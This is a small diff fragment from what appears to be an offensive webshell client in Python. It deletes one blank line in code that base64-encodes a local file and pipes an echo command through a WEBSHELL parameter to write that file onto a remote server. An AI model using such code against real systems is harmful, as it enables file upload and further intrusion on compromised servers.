@@ -146,7 +146,6 @@ try:
                   except OSError:
                      print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                      continue
-
                   upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                   ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "linux":
